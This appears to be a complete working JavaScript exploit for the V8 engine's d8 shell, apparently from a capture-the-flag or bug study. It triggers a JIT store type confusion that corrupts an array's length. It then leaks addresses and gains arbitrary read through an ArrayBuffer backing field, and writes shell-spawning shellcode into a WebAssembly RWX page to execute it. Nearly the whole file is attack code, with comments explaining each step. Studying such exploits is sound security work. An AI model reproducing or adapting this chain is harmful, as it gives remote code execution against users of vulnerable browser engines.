function f(o, g)
{
	const x = o.x;
	// first CheckMap
	// if we change this to o.x = 1,
	// JSStoreNamed will not be converted to StoreField
	// not sure why
	g();
	o.d = 0x2000;
	// rewrite length field of array to 0x2000
}

a = [1.1];
for (var i = 0; i < 0x1000; i++)
{
	f({x:1,y:2,z:3,l:4,a:5,b:6,c:7,d:8,e:9}, ()=>1);
	f({x:1,y:2,z:3,l:4,a:5,b:6,c:7,d:8,e:9}, ()=>2);
	f({x:1,y:2,z:3,l:4,a:5,b:6,c:7,d:8,e:9}, ()=>3);
	// trigger JIT
	// call with different g is to prevent inlining optimization
}
obj = {x:1,y:2,z:3,l:4,a:5,b:6,c:7,d:8,e:9};
arr = [1.1, 2.2];
const ab = new ArrayBuffer(0x123);
const sig = {a:0xdead,b:0xbeef,c:(()=>1)};
// put an array, a ArrayBuffer, a signature object
// after obj
// this even holds after GC is triggered

function g()
{
	obj.__defineGetter__('xx',()=>2);
	obj.__defineGetter__('xx',()=>2);
	// shrink size of obj
	for (var i = 0; i < 0x10; i++)
		new ArrayBuffer(0x1000000);
	// trigger GC
}

f(obj, g);
// trigger vulnerability

if (arr.length !== 0x2000)
	throw Error("failed to corrupt array length");
// now length of array should already be corrupted

// then here is util functions for exploitation
// I have not putted them before
// because if we do so, object layout after GC will change
// to be specific, `arr` cannot lay just after `obj`
// not sure why, maybe it's because more objects are allocated,
// which changes behavior of GC
function getWMain()
{
	const wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
	const wasmModule = new WebAssembly.Module(wasmCode);
	const wasmInstance = new WebAssembly.Instance(wasmModule, {});
	return wasmInstance.exports.main;
}
wmain = getWMain();
function dp(x){}//{%DebugPrint(x);}
const print = console.log;
const assert = function (b, msg)
{
	if (!b)
		throw Error(msg);
}
const buf8 = new ArrayBuffer(8);
const f64 = new Float64Array(buf8);
const u32 = new Uint32Array(buf8);
function d2u(val)
{ //double ==> Uint64
	f64[0] = val;
	let tmp = Array.from(u32);
	return tmp[1] * 0x100000000 + tmp[0];
}
function u2d(val)
{ //Uint64 ==> double
	let tmp = [];
	tmp[0] = parseInt(val % 0x100000000);
	tmp[1] = parseInt((val - tmp[0]) / 0x100000000);
	u32.set(tmp);
	return f64[0];
}
const hex = (x) => ("0x" + x.toString(16));
dp(arr);
dp(ab);
dp(sig);

sig.c = wmain;
// change sig.c to wmain in order to leak it

var backingPos, wmainAddr;
for (let i = 0; i < arr.length-2; i++)
{
	if (d2u(arr[i]) === 0x123)
	{// find ArrayBuffer
		backingPos = i + 1;
	}
	else if (d2u(arr[i]) === 0xdead00000000 &&
		d2u(arr[i+1]) === 0xbeef00000000)
	{// find sig object, and extract wmain address
		wmainAddr = d2u(arr[i+2]) - 1;
	}
}

assert(backingPos !== undefined, "failed to find ArrayBuffer")
assert(wmainAddr !== undefined, "failed to find sig array")
print("[*] index of backing field = " + hex(backingPos));
print("[*] address of wmain function = " + hex(wmainAddr));
const dataView = new DataView(ab);
function memRead(addr)
{
	arr[backingPos] = u2d(addr);
	return d2u(dataView.getFloat64(0, true));
}
// so now we can rewrite backing field
// to acheive arbitrary read

rwxAddr = memRead(wmainAddr - 0x110);
// by debugging,
// wmainAddr-0x110 seems store the rwx page address
print("[*] RWX page = " + hex(rwxAddr));

arr[backingPos] = u2d(rwxAddr);
// set backing field to rwx page

var shellcode = [
    0x99583b6a, 0x2fbb4852,
    0x6e69622f, 0x5368732f,
    0x57525f54, 0x050f5e54
];
for (var i = 0; i < shellcode.length; i++)
{
	dataView.setUint32(i * 4, shellcode[i], true);
}
// write shellcode to rwx page

wmain();
// execute the shellcode

throw Error("failed to get shell");

// another point to note is that the exploit fails
// when being run in release mode using gdb
// not sure why gdb changes behavior of the d8